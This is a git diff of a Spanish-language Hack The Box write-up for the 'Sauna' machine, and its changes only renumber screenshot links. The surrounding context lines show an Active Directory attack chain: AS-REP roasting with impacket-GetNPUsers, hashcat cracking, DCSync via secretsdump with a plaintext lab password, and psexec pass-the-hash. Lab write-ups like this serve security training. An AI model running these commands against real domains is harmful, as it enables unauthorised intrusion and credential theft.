@@ -41,7 +41,7 @@ nmap -sV -sC -p 53,80,88,135,139,389,445,636,3268,5985 10.129.29.118
 > 
 > 
 > 
-> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Sauna/assets/image2.png)
+> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Sauna/assets/image1.png)
 > 
 
 ---
@@ -64,7 +64,7 @@ Generamos variaciones típicas de usernames corporativos (formato inicial+apelli
 > 
 > 
 > 
-> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Sauna/assets/image3.png)
+> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Sauna/assets/image2.png)
 > 
 
 ---
@@ -81,7 +81,7 @@ impacket-GetNPUsers egotistical-bank.local/ -dc-ip 10.129.29.118 \
 > 
 > 
 > 
-> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Sauna/assets/image4.png)
+> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Sauna/assets/image3.png)
 > 
 
 Crackeamos con hashcat modo 18200:
@@ -93,7 +93,7 @@ hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt
 > 
 > 
 > 
-> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Sauna/assets/image5.png)
+> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Sauna/assets/image4.png)
 > 
 
 ---
@@ -122,7 +122,7 @@ WinPEAS identifica credenciales almacenadas en el registro de autologon de Windo
 > 
 > 
 > 
-> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Sauna/assets/image6.png)
+> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Sauna/assets/image5.png)
 > 
 
 Ojo importante: WinPEAS reporta el usuario como `svc_loanmanager` pero el usuario real es `svc_loanmgr` — se puede verificar listando `c:\Users\` desde la sesión de fsmith. Siempre verificar el nombre exacto antes de intentar autenticación.
@@ -142,7 +142,7 @@ Cargamos el zip de SharpHound en BloodHound. El grafo muestra que `svc_loanmgr` 
 > 
 > 
 > 
-> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Sauna/assets/image7.png)
+> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Sauna/assets/image6.png)
 > 
 
 No hay que escalar ni modificar ACLs — `svc_loanmgr` ya tiene los permisos de serie. DCSync directo.
@@ -156,7 +156,7 @@ impacket-secretsdump 'EGOTISTICALBANK/svc_loanmgr:Moneymakestheworldgoround!@10.
 > 
 > 
 > 
-> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Sauna/assets/image8.png)
+> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Sauna/assets/image7.png)
 > 
 
 ## Pass-the-Hash → SYSTEM
@@ -169,7 +169,7 @@ impacket-psexec administrator@10.129.31.5 \
 > 
 > 
 > 
-> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Sauna/assets/image9.png)
+> ![flags](https://github.com/2eevi/htb-writeups/blob/main/Sauna/assets/image8.png)
 > 
 
 ---
